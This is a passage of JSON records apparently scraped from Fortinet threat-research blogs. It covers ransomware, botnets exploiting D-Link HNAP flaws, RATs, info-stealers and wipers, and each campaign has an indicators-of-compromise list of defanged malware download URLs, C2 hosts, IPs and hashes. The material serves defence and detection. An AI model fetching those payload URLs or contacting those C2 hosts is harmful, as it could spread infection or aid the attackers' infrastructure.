payment in cryptocurrency for the decryption key. FortiGuard Labs has captured and reported on several ransomware variants from the Phobos family, includingEKINGand8Base.\nRecently, FortiGuard Labs uncovered an Office document containing a VBA script aimed at propagating the FAUST ransomware, another variant of Phobos. The attackers utilized the Gitea service to store several files encoded in Base64, each carrying a malicious binary. When these files are injected into a system's memory, they initiate a file encryption attack. Figure 1 shows the attack chain.\nIn this blog, we explore the different phases of file deployment and delve into the details of the delivered malware.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This report delved into the FAUST variant of the Phobos ransomware, providing insights into the process of downloading the payload file from an MS Excel document embedded with VBA script. Our analysis uncovered a threat actor employing a fileless attack to deploy shellcode, injecting the final FAUST payload into the victim's system. The FAUST variant exhibits the ability to maintain persistence in an environment and creates multiple threads for efficient execution. To safeguard devices from potential malware threats, users must exercise caution and refrain from opening document files from untrusted sources.\nFortinet Protections\nThe malware described in this report are detected and blocked byFortiGuard Antivirusas:\nVBA/Dropper.CB!trW64/Agent.ACFT!trW64/Agent.A9D5!trW64/Dloader.584B!trW32/FilecoderPhobos.C!tr.ransom\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\nWe also suggest that organizations go through the freeFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology.\nFortinet also provides an extensive portfolio of services powered by our global FortiGuard team of seasoned cybersecurity experts.\nThe FortiGuard IP Reputation and Anti-Botnet Security Services proactively block attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nFortiRecon, a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts, provides unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors' motivations and TTPs. The service can detect evidence of attacks in progress, allowing customers to rapidly respond to and shut down active threats.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "Files:\n426284b7dedb929129687303f1bf7e4def607f404c93f7736d17241e43f0ab3350e2cb600471fc38c4245d596f92f5444e7e17cd21dd794ba7d547e0f2d9a9d5a0a59d83fa8631d0b9de2f477350faa89499e96fd5ec07069e30992aaabe913aebe77c060f8155e01703cfc898685f548b6da12379e6aefb996dbcaac201587cc10dc2f6694414b68c10139195d7db2bb655f3afdcc1ac6885ef41ef1f0078df", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:D-Link DIR-645 Wired/Wireless Router Rev. Ax with firmware 1.04b12 and earlier. D-Link DIR-806 devices. D-Link GO-RT-AC750 GORTAC750_revA_v101b03 and GO-RT-AC750_revB_FWv200b02. D-Link DIR-845L router v1.01KRb03 and beforeImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High\nFortiGuard Labs noticed a spike in the activity of two different botnets in October and November of 2024. One was the Mirai variant \"FICORA,\" and the other was the Kaiten variant \"CAPSAICIN.\" These botnets are frequently spread through documented D-Link vulnerabilities that allow remote attackers to execute malicious commands via a GetDeviceSettings action on the HNAP (Home Network Administration Protocol) interface. This HNAP weakness was first exposed almost a decade ago, with numerous devices affected by a variety of CVE numbers, including CVE-2015-2051, CVE-2019-10891, CVE-2022-37056, and CVE-2024-33112.\nAccording to our IPS telemetry, attackers frequently reuse older attacks, which accounts for the continued spread of the \"FICORA\" and \"CAPSAICIN\" botnets to victim hosts and infected targets. This article looks at their infected traffic and offers insights into these botnets.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Although the weaknesses exploited in this attack had been exposed and patched nearly a decade ago, these attacks have remained continuously active worldwide. FortiGuard Labs discovered that \"FICORA\" and \"CAPSAICIN\" spread through this weakness. Because of this, it is crucial for every enterprise to regularly update the kernel of their devices and maintain comprehensive monitoring. These steps will help reduce the likelihood of malware being deployed through this vulnerability.\nFortinet Protections\nThe malware described in this report is detected and blocked byFortiGuard Antivirusas:\nELF/Gafgyt.ST!trELF/Gafgyt.C!trELF/Gafgyt.AEA!trBASH/TrojanDownloader.SH!trBASH/Mirai.AEH!tr.dldrELF/Mirai.A!trELF/Mirai.CTQ!trELF/Mirai.CLY!trBASH/Agent.SHS!tr.dldr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected.\nTheFortiGuard Web Filtering Serviceblocks the C2 server.\nFortiGuard Labs provides IPS signature against attacks exploiting the following vulnerabilities:\nCVE-2015-2051: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2019-10891: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2022-37056: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2024-33112: D-Link.Devices.HNAP.SOAPAction-Header.Command.Execution\nWe also suggest that organizations go through Fortinet'sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals(FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks.\nFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "URLs\nhxxp://103[.]149[.]87[.]69/multihxxp://103[.]149[.]87[.]69/la.bot.archxxp://103[.]149[.]87[.]69/la.bot.armhxxp://103[.]149[.]87[.]69/la.bot.arm5hxxp://103[.]149[.]87[.]69/la.bot.arm6hxxp://103[.]149[.]87[.]69/la.bot.arm7hxxp://103[.]149[.]87[.]69/la.bot.m68khxxp://103[.]149[.]87[.]69/la.bot.mipshxxp://103[.]149[.]87[.]69/la.bot.mipselhxxp://103[.]149[.]87[.]69/la.bot.powerpchxxp://103[.]149[.]87[.]69/la.bot.sh4hxxp://103[.]149[.]87[.]69/la.bot.sparc\nhxxp://87[.]11[.]174[.]141/bins.shhxxp://pirati[.]abuser[.]eu/yakuza.yak.shhxxp://pirati[.]abuser[.]eu/yakuza.arm5hxxp://pirati[.]abuser[.]eu/yakuza.arm6hxxp://pirati[.]abuser[.]eu/yakuza.arm7hxxp://pirati[.]abuser[.]eu/yakuza.i586hxxp://pirati[.]abuser[.]eu/yakuza.i686hxxp://pirati[.]abuser[.]eu/yakuza.m68khxxp://pirati[.]abuser[.]eu/yakuza.mipshxxp://pirati[.]abuser[.]eu/yakuza.mipselhxxp://pirati[.]abuser[.]eu/yakuza.ppchxxp://pirati[.]abuser[.]eu/yakuza.sparchxxp://pirati[.]abuser[.]eu/yakuza.x86hxxp://87[.]10[.]220[.]221/bins.shhxxp://87[.]10[.]220[.]221/yakuza.shhxxp://87[.]10[.]220[.]221/yakuza.arm4hxxp://87[.]10[.]220[.]221/yakuza.arm5hxxp://87[.]10[.]220[.]221/yakuza.arm6hxxp://87[.]10[.]220[.]221/yakuza.arm7hxxp://87[.]10[.]220[.]221/yakuza.i586hxxp://87[.]10[.]220[.]221/yakuza.i686hxxp://87[.]10[.]220[.]221/yakuza.m68khxxp://87[.]10[.]220[.]221/yakuza.mipshxxp://87[.]10[.]220[.]221/yakuza.mipselhxxp://87[.]10[.]220[.]221/yakuza.ppchxxp://87[.]10[.]220[.]221/yakuza.sparchxxp://87[.]10[.]220[.]221/yakuza.x86\nHosts\n103[.]149[.]87[.]69ru[.]coziest[.]lolf[.]codingdrunk[.]ccwww[.]codingdrunk[.]ineighteen[.]piratenineteen[.]libre75cents[.]libre2joints[.]librefortyfivehundred[.]dyn21savage[.]dynimaverygoodbadboy[.]librele[.]codingdrunk[.]in87[.]11[.]174[.]141pirati[.]abuser[.]eu87[.]10[.]220[.]22145[.]86[.]86[.]60194[.]110[.]247[.]46\nFiles\nf71dc58cc969e79cb0fdfe5163fbb9ed4fee5e13cc9407a11d231601ee4c6e23ea83411bd7b6e5a7364f7b8b9018f0f17f7084aeb58a47736dd80c99cfeac7f148a04c7c33a787ef72f1a61aec9fad87d6bd9c49542f52af7e029ac83475f45d18c92006951f93a77df14eca6430f32389080838d97c9e47364bf82f6c21a907\n9b161a32d89f9b19d40cd4c21d436c1daf208b5d159ffe1df7ad5fd1a57610e5faeea9d5091384195e87caae9dd88010c9a2b3b2c88ae9cac8d79fd94f250e9f10d7aedc963ea77302b967aad100d7dd90d95abcdb099c5a0a2df309c52c32b87f6912de8bef9ced5b9018401452278570b4264bb1e935292575f2c3a0616ec4a06fd0b8936f5b2370db5f7ec933d53bd8a1bf5042cdc5c052390d1ecc7c0e07764a03bf28f9eec50a1bd994308e977a64201fbe5d41337bdcc942c74861bcd3df176fb8cfbc7512c77673f862e73833641ebb0d43213492c168f99302dcd5e3ac2df391ede03df27bcf238077d2dddcde24cd86f16202c5c51ecd31b7596a68ca3f6dce945ccad5a50ea01262b2d42171f893632fc5c5b8ce4499990e978e5bafee245b6f999f6b9d0dd997436df5f2abfb3c8d2a8811ff57e3c21637207d62ec508df7cb142a639b0c33f710d5e49c29a5a578521b6306bee28012aadde4a8\nCAPSAICIN\n8349ba17f028b6a17aaa09cd17f1107409611a0734e06e6047ccc33e8ff669b0b3ad8409d82500e790e6599337abe4d6edf5bd4c6737f8357d19edd82c88b064ec87dc841af77ec2987f3e8ae316143218e9557e281ca13fb954536aa9f9caf1784c9711eadceb7fedf022b7d7f00cff7a75d05c18ff726e257602e3a3ccccc1bde6ef047e0880ac7ef02e56eb87d5bc39116e98ef97a5b1960e9a55cea5082bc7be8d1b8948e1cb095d46376ced64367718ed2d9270c2fc99c7052a9d1ffed74600703535e35b464f0198a1fa95e3668a0c956ab68ce7b719c28031d69b86ff6e3ef9404817e168c974000205b27723bc93abd7fbf0581c16bb5d2e1c5c6e4a32e66b87f47245a892b102b7141d3845540b270c278e221f502807758a4e5dee540c00e6c0b53332128b605b0d5e0926db0560a541bb13448d094764844763dfb74dbd02b7ebb51700f3c5900283e46570fe497f9b415d25a029623118073519148f6b990fc1f1903287cd5c20276664b332dd3ba8d58f2bf8c26334c93c3af5464e2f1faab2a40db44f118f7c3d1f9b300297fe6ced83fabe87563fc82efe95b699cd64b9895cdcc325d7dd96c9eca623d3ec0247d20f39323547132c8fa63b1007f5613a91a5d4170f28e24bfa704c8a63d95a2b4d033ff2bff7e2fe3dcffe7a815d4ca3771de8a71cde2bdacf951bf48ea5854eb0a2af5db7d13ad51c44abd6a2a22000d68d79caeae482d8cf092c2d84d55dccee05e179a961c72f77b1ba7ab36a93f009058e60c8a45b900c1c7ae38c96005a43a39e45be9dc7af9d6da8803abfe19cdc6c0c41acfeb210a2361cab96d5926b2c43e5eb3b589a6ed189ad7b29053306f194ca75021952f97f894d8eae6d2e1d02939df37b62d3845bfdb759704cf55b9fa439d6f7a36821a50178e9d73ddc5407ff340460c054d7defc54aaa49b7b4f1e71623c42bc77bb7aa40534bcb7312da511b041799bf0e1a63ee71ca1d5a53c4379c3015c74af2b18c1d9285ac1a48d515f9b7827e4f900a61bde", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Remote attackers gain control of the infected systemsSeverity Level:Critical\nFortiGuard Labs recently identified the use of a Russian-language Word document equipped with a malicious macro in the ongoing Konni campaign. Despite the document's creation date of September, ongoing activity on the campaign's C2 server is evident in internal telemetry, as shown in Figure 1.\nThis campaign relies on aremote access trojan (RAT)capable of extracting information and executing commands on compromised devices. Operating for several years, this campaign employs diverse strategies for initial access, payload delivery, and establishing persistence within victims' networks. In this blog, we will elaborate on the behavior of the malware at each stage.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This article explores an advanced toolset employed by a sophisticated threat actor within a Word document using batch scripts and DLL files. The payload incorporates a UAC bypass and encrypted communication with a C2 server, enabling the threat actor to execute privileged commands. As this malware continues to evolve, users are advised to exercise caution with suspicious documents.", "source": "Fortinet"}, {"title": "ioc", "content": "C2 List:\nkmdqj1[.]c1[.]bizouvxu2[.]c1[.]biz9b31n8[.]c1[.]biz3pl0y5[.]c1[.]bizdpgbep[.]c1[.]biz7qnbae[.]c1[.]bizglws5m[.]c1[.]bizewqqa4[.]c1[.]biz3897lb[.]c1[.]biz558ga9[.]c1[.]bizb91stf[.]c1[.]bizbg5pl1[.]c1[.]bizcaoy9n[.]c1[.]bizrziju6[.]c1[.]bizpm90p1[.]c1[.]bizpxyunf[.]c1[.]bizm2jymd[.]c1[.]bizaocsff[.]c1[.]biz6e2nbc[.]c1[.]bizvqt9i1[.]c1[.]biz\nFiles:\nac9b814b98a962bc77b2ab862d9c3b1ba5f7e86b80797259b4fcb40bfb389081f07e55ce20e944706232013241d23282e652de2c9514904dede14d4a711a5d1d085cdb09aba0024c0cadbefe428817829bbe4ab0f68598572ebccc2f6f25e78f793b8e72fded73ae6839e678b03bd5c99959f47a1ad632095ba60fb89f66fa9183e66d912ca592bc2accfd9c275647f287b6dc72a859054a348e616537999b64656dd6e67a51aebc6c69dc35eaba2e1502f225ae6fd9d0a5ff70879982427844cfbc7e6a89e4a23a72c7bcd9019197721f18506d9ab842011e0ab9d9eb24c2cc", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The information collected can be used for future attacksSeverity Level:High\nFortiGuard Labs recently discovered a threat group using YouTube channels to distribute a Lumma Stealer variant. We found and reported on a similar attack method via YouTube inMarch 2023. These YouTube videos typically feature content related to cracked applications, presenting users with similar installation guides and incorporating malicious URLs often shortened using services like TinyURL and Cuttly. To circumvent straightforward web filter blacklists, the attackers exploit open-source platforms like GitHub and MediaFire instead of deploying their malicious servers. In this case, the shared links lead to the direct download of a new private .NET loader responsible for fetching the final malware, Lumma Stealer.\nLumma Stealer targets sensitive information, including user credentials, system details, browser data, and extensions. It has been advertised on the dark web and a Telegram channel since 2022, with over a dozen observed command-and-control (C2) servers in the wild and multiple updates. Figure 1 shows Lumma Stealer's C2 server telemetry, illustrating a global presence with a peak observed in December.\nIn this article, we will elaborate on each stage's behaviors that facilitated the stealer's distribution.", "source": "Fortinet"}, {"title": "Conclusion", "content": "In this attack, the malicious actor targets YouTube channels to disseminate Lumma Stealer. The crafted installation ZIP file serves as an effective bait to deliver the payload, exploiting the user's intention to install the application and prompting them to click the installation file without hesitation. URLs from open-source websites throughout the scheme aim to diminish user awareness. The attackers further deploy a private .NET loader with environment checks, various anti-virtual machine (Anti-VM), and anti-debugging functions. Users must exercise caution regarding unclear application sources and ensure legitimate applications from reputable and secure origins are used.\nFortinet Protections\nThe malware described in this report are detected and blocked byFortiGuard Antivirusas:\nW32/Stealer.QLD!trMSIL/Agent.WML!trMSIL/Kryptik.BJF!trLNK/Agent.WML!tr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\nThe URLs are rated as \"Malicious Websites\" by theFortiGuard Web Filteringservice.\nWe also suggest that organizations go through the freeFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology.\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "IP Addresses\n176[.]113[.]115[.]224176[.]113[.]115[.]226176[.]113[.]115[.]227176[.]113[.]115[.]229176[.]113[.]115[.]232\nHostnames\nNetovrema[.]pwopposesicknessopw[.]pwpolitefrightenpowoa[.]pwchincenterblandwka[.]pw\nFiles\n48cbeb1b1ca0a7b3a9f6ac56273fbaf85e78c534e26fb2bca1152ecd7542af54483672a00ea676236ea423c91d576542dc572be864a4162df031faf35897a53201a23f8f59455eb97f55086c21be934e6e5db07e64acb6e63c8d358b763dab4f7603c6dd9edca615d6dc3599970c203555b57e2cab208d87545188b57aa2c6b1", "source": "Fortinet"}, {"title": "Introduction", "content": "FortiGuard Labs has been actively tracking wiper malware targeting Ukrainian organizations since the start of the 2022 Russia-Ukraine conflict. The sudden spike in wiper malware began early in the year with numerous new wiper samples targeted at Ukraine. It displayed a side of cyberattacks we rarely see: pure destruction. We published anarticlelast April 2022 to help people understand the context, history, and technical setup of wiper attacks. This post focuses on what happened the rest of the year and how wiper malware and their attack scenarios have changed.\nAffected Platforms:MultipleImpacted Users:Large organizationsImpact:Data loss and OS and file corruptionSeverity Level:High", "source": "Fortinet"}, {"title": "Conclusion", "content": "2022 provided us with new perspectives on destructive malware. We saw different wiping techniques, different motivations, and differentmotivations, actors, and deployment scenarios. New wiper instances, such as the Azov and Endurance wipers, show that actors are actively engaged in increasingly malicious activity. They are also trying to address shorter threat detection and response time by effectively optimizing the performance of their wiping strategies. And we are also seeing increased attention being paid to OT networks, such as the example of the Industroyer.V2 malware. The point is clear. The gloves are off as threat actors increasingly engage in attacks designed with one purpose: to destroy their targets.", "source": "Fortinet"}, {"title": "ioc", "content": "650f0d694c0928d88aeeed649cf629fc8a7bec604563bca716b1688227e0cc7e - Azov\n100c5e4d5b7e468f1f16b22c05b2ff1cfaa02eafa07447c7d83e2983e42647f0 - Somnia_07_08_22_with_FunnySomnia.rar\nac5e68c15f5094cc6efb8d25e1b2eb13d1b38b104f31e1c76ce472537d715e08 - Somnia_07_08_22_with_FunnySomnia.exe (Somnia)\n99cf5c03dac82c1f4de25309a8a99dcabf964660301308a606cdb40c79d15317 - 1.exe (Cobalt Strike Beacon)\n156965227cbeeb0e387cb83adb93ccb3225f598136a43f7f60974591c12fafcf - funnysomnia.exe\ne449c28e658bafb7e32c89b07ddee36cadeddfc77f17dd1be801b134a6857aa9 - text.exe (Somnia*)\nfbed7e92caefbd74437d0970921bfd7cb724c98c90efd9b6d0c2ac377751c9e5 - Ip_scanner.zip\n06fe57cadb837a4e3b47589e95bb01aec1cfb7ce62fdba1f4323bb471591e1d2 - Ip_scanner.exe (Themida; Vidar)\n1e0facd62d1958ccf79e049270061a9fce3223f7986c526f6f3a93ef85180a72 - Ip_scanner_unpacked.exe (Vidar)\n3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105355fe \u2013 DoubleZero\n931b6b29e13d76a0e2e1e8b6910873d5ff7b88fd8c51cadf46057e47b695f187 \u2013 Endurance\nBDF8B53D73CA1ED1B649B32A61608B2CF952397EF3D5FC2E6E9F41AD98C40110 \u2013 Cry Wiper\n91a9180a9cf7674c34ed53a8aa4e36b798334d1f448aeaf1afb9add4fd322b6e \u2013 Fantasy\n0ad0cd07ca69d8fd2b075fef6e6dd5e9f7debca92af3a6b84d83e51e23bc182d \u2013 Bruh Wiper\nLearn more about Fortinet'sFortiGuard Labsthreat research and global intelligence organization and Fortinet's FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nLast year, FortiGuard Labs uncovered the 8220 Gang's utilization ofScrubCryptto launch attacks targeting exploitable Oracle WebLogic Servers. ScrubCrypt has been described as an \"antivirus evasion tool\" that converts executables into undetectable batch files. It offers several options to manipulate malware, making it more challenging for antivirus products to detect.\nWe recently discovered a threat actor distributing a phishing email containing malicious Scalable Vector Graphics (SVG) files. The email lures victims into clicking on an attachment, which downloads a ZIP file containing a Batch file obfuscated with the BatCloak tool. ScrubCrypt is then used to load the final payload, VenomRAT while maintaining a connection with a command and control (C2) server to install plugins on victims' environments. The plugin files downloaded from the C2 server include VenomRAT version 6, Remcos, XWorm, NanoCore, and a stealer designed for specific crypto wallets.\nThis article provides detailed insights into how the threat actor distributes VenomRAT and other plugins.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This analysis reveals a sophisticated attack leveraging multiple layers of obfuscation and evasion techniques to distribute and execute VenomRAT via ScrubCrypt. The attackers employ a variety of methods, including phishing emails with malicious attachments, obfuscated script files, and Guloader PowerShell, to infiltrate and compromise victim systems. Furthermore, deploying plugins through different payloads highlights the versatility and adaptability of the attack campaign.\nThe attackers' ability to persist in the system, evade detection, and execute malicious payloads underscores the importance of robust cybersecurity measures and vigilant monitoring to mitigate such threats effectively.", "source": "Fortinet"}, {"title": "ioc", "content": "hjkdnd[.]duckdns[.]orgmup830634[.]duckdns[.]orgmarkjohnhvncpure[.]duckdns[.]orghomoney177[.]duckdns[.]orgfebvenom8[.]duckdns[.]orgrachesxwdavid[.]duckdns[.]org\nhxxps://nanoshd[.]pro/files/new_image.jpg?14441723hxxps://nanoshield[.]pro/new_image2.jpg?166154725hxxps://kisanbethak[.]com/P/hxxps://kisanbethak[.]com/K/\n06779e1015bd7dd2012ad03f7bb3f34e8d99d6ca41106f89cb9fb1ec46fe034e0b5631041336a58ab859d273d76c571dd372220dfa1583b597a2fe5339ad4bf70f1d6aab547ceca6e71ac2e5a54afdaea597318fe7b6ca337f5b92fdff5961682373840bc455d601551304ec46c281b218e90a91dce3823709c213814636e899258578c03ca314ac3a636a91e8b3245230eae974cf50799d89b3f931e637014c411ad772af94a042413af482a2ef356d3217bcc5123353e3c574347cb93e3d5a4a4b5c22c877437c359ef2acaeeb059881da43b11798581cf2f31c2c83fc34184cda23993d793ef070be7b9066f31a45b10c1e72d809f4a43726da977a0069d851ecf11a64e934409bfada2b6f0c4d89c3420ca95640bc88f928906e6f0b483253a522051e0319176dece493b7e2543135ed41c402adbfeda32a5f6be7d68175546a85e384ced3d4535bad16a877ecd36a79849c379c5daa357689116f042c1b5c5caa3182d6b121c1445d6ca81134ec262cd5ea4f9ef1944f993b63d19876475f1746b4bd8d94d4d3feb1e2d4a829b6c3bab9341e272341f4b3a1da01d207456aaff578555cb82159a9c16a159f0437c39b673744e0c537c4b7f0f67f56c5d96ac5c7284aaa0c195723df7a78ae610a7ee096b3b5bc19f6838451acd438116e71a22bed7ab5a26158fc1cf1b7bb87146254672483aad72736817ff16e656c7b7d7a710e3c0e5da830213f9b72f44a72d721adcf17abc838f28286dde8a1e8d97d9c8d44554ee10310805920afb51249a1e8cd3e32b430e8c9638fec316913d385790dad1a0af5febd7d90e0ec9ce680ec87dcc31a94a25bfb454bb121164bfd8e97019f8c4712f1fc9728c4706112a5ef85a05aa809985709faef951925e09494b2e06e45407f193cfe58e18f5c250bbd1b8e857a754f1c366913129b9dada7bee35a9d30d6f69cd6d173c6a6a93110cac59ab3710e32eced6f266581e88b87cd1364d8c7f6f0246ed91cd294e2e506e7c94ba2f9a33c373c6fcfe04bbe17e7d04bf1a9f6014bf4bcdb3ac4eb6d85bcc4159ae25a7f00c4493cbcb8e892e159d05ad3dc62e1dc45fd31dc2382c1ea5e5f26f4f7692cb2ef8fd1c6e74b69fa16dc2c1694d363d78cdfed0574cf51413b9b48d932e076033bb76cf69a4470b7e9dceea68a037376b323d2a934f9fdc59bfbd2c2c0ed66014bdf059f403f4dc6f2e190d172b7d3c7f1055052f0ed3da5d5979a8a2b622ca2fbcea90774a5bf6008f02c04bc428694a11917375f41ecb7c7aa326cf242b4c56ed1e7b3ae14d5dd68f4164be3d357682754559aa32ea74c284eee64140d3f56a63a225d5de10d051c", "source": "Fortinet"}, {"title": "Introduction", "content": "After FortiGuard Labs reported on RapperBot in our previous article titledSo RapperBot, What Ya Bruting For?in August 2022, there was a significant drop in the number of samples collected in the wild. But in early October 2022, new samples with the same distinctive C2 protocol used by RapperBot were detected.\nUnlike the murky objectives of the previous campaign, it is quickly evident that these samples are part of a separate campaign to launchDistributed Denial of Service(DDoS) attacks against game servers, which we believe to be a re-emergence of a similar campaign from earlier this year.\nAffected Platforms:LinuxImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical\nThis article discusses the differences observed in this campaign and its relation to the previous RapperBot and similar campaigns in the past.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Based on the undeniable similarities between this new campaign and the previously reported RapperBot campaign, it is highly likely that they are being operated by a single threat actor or by different threat actors with access to a privately-shared base source code.\nUnlike the previous RapperBot campaign, this new campaign has a clear motivation to compromise as many IoT devices as possible to build a DDoS botnet.\nAlthough this new campaign has evolved significantly from previous campaigns, mitigating it remains the same-setting strong passwords for all devices connected to the internet.\nFortiGuard Labs will continue to monitor RapperBot's development.", "source": "Fortinet"}, {"title": "ioc", "content": "Files\n3d5c5d9e792e0a5f3648438b7510b284f924ab433f08d558b6e082e1d5414a037afcac5f71e9205879e0e476d3388898a62e7aa4a3e4a059884f40ea36cfd57f8ec79a35700f6691f0d88d53647e9f2b75648710ecd119e55815331fc3bdd0b5a12ad4bc394d60bc037271e1c2df1bd2b87bdaaba85f6c1b7d046341f027cc2df000bf482040b48595badee1fc56afb95449ac48b5dc35fe3a05542cbf18f6584aa9175c1846557107ec197ea73d4cc8dbe6d575a8fd86ae214ff9b3a00e438bf98261eb7dc122449c158118cc9c660683206983a9e90ff73eb88c4705e0c48e\nDownload URLs\nhxxp://185[.]216[.]71[.]149/armv4l\nhxxp://185[.]216[.]71[.]149/armv5l\nhxxp://185[.]216[.]71[.]149/armv6l\nhxxp://185[.]216[.]71[.]149/armv7l\nhxxp://185[.]216[.]71[.]149/mips\nhxxp://185[.]216[.]71[.]149/mipsel\nhxxp://185[.]216[.]71[.]149/powerpc\nhxxp://185[.]216[.]71[.]149/sparc\nhxxp://185[.]216[.]71[.]149/sh4\nhxxp://185[.]216[.]71[.]149/bot_arm4_el\nhxxp://185[.]216[.]71[.]149/bot_arm5_el\nhxxp://185[.]216[.]71[.]149/bot_arm6_el\nhxxp://185[.]216[.]71[.]149/bot_arm7_el\nhxxp://185[.]216[.]71[.]149/bot_mips_eb\nhxxp://185[.]216[.]71[.]149/bot_mips_el\nhxxp://185[.]216[.]71[.]149/bot_sh_el\nC2\n185[.]216[.]71[.]149\nLearn more about Fortinet'sFortiGuard Labsthreat research and global intelligence organization and Fortinet's FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nIn January 2024, FortiGuard Labs obtained an Excel document distributing an info-stealer. From the fingerprints in this attack, it is related to a Vietnamese-based group that wasfirst reportedon in August 2023 andagainin September. The attack stages before the info-stealer are simple downloaders that increase the difficulty of detection. This article introduces each stage in this attack and provides a glimpse into the world behind the malware campaign.", "source": "Fortinet"}, {"title": "Conclusion", "content": "The threat actors separate the malware campaign into several simple downloaders and use open platforms to avoid detection. However, this also provided clues to identify the hacker group. From the information left in the files, we also found files abused in other campaigns and the SNS platforms being abused to distribute malware. Such services not only provide a convenient environment for people but are commonly used by threat actors.", "source": "Fortinet"}, {"title": "Introduction", "content": "Fortinet's FortiGuard Labs observed a phishing campaign in the wild that delivered a malicious Word document as an attachment. This document contained crafted data designed to exploit the vulnerabilityCVE-2017-11882. After conducting an in-depth analysis, I discovered that the campaign was spreading a new variant of Formbook.\nFormbook is information-stealing malware targeting Windows users. It steals sensitive data from compromised systems, including stored credentials from popular software, the victim's keystrokes, screenshots, and system clipboard data.\nI will present my research into this malware in a series of analysis blogs. This first one provides insights into how the phishing email tricks the recipient into opening the attached Word document, how it exploits the vulnerability CVE-2017-11882 with crafted equation data, how it downloads and decrypts the fileless FormBook executable, and how it ultimately executes the FormBook malware in a selected target process via process hollowing.", "source": "Fortinet"}, {"title": "Summary", "content": "In this first part of the blog series on the FormBook malware, I presented the entire process, from the phishing email to how the FormBook payload is downloaded, decrypted, and deployed in a targeted process.\nTo start, I presented the phishing email we discovered that was designed to trick recipients into opening a fake sales order attachment. Once the attached Word document is opened on the targeted device, it extracts a 64-bit DLL file, disguised as \"AdobeID.pdf,\" into the system's temporary folder. At the same time, it exploits the CVE-2017-11882 vulnerability in Microsoft Equation Editor 3.0 to execute the extracted DLL.\nThe DLL file is launched via rundll32.exe, establishing persistence on the victim's system by adding an auto-run item to the system registry. Additionally, it downloads and decrypts the FormBook executable file.\nI then provided a detailed explanation of how the decrypted FormBook payload is deployed in a target process (C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe) through process hollowing, as well as the Windows-native APIs it calls to accomplish this task.\nIn Part II of this series, I will present the anti-analysis techniques used in this variant of FormBook and how FormBook leverages the Heaven's Gate technique to prevent analysis and detection. I'll also cover how it collects sensitive data from the compromised device, its communications with its command and control (C2) server, and the specific C&C commands it uses to control the victim's system. Stay tuned.\nFortinet Protections\nFortinet customers are already protected from this campaign with FortiGuard's AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows:\nThe FortiGuard's Anti-Botnet Service has blocked the DNS requests for downloading the FormBook variant.\nThe relevant URL downloading the PNG file is rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.\nFortiMail recognizes the phishing email as \"virus detected.\" In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet's FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts.\nFortiGuard IPS service detects the vulnerability exploit against CVE-2017-11882 with the signature \"MS.Office.EQNEDT32.EXE.Equation.Parsing.Memory.Corruption\".\nFortiGuard Antivirus service detects the malicious Word document, the embedded 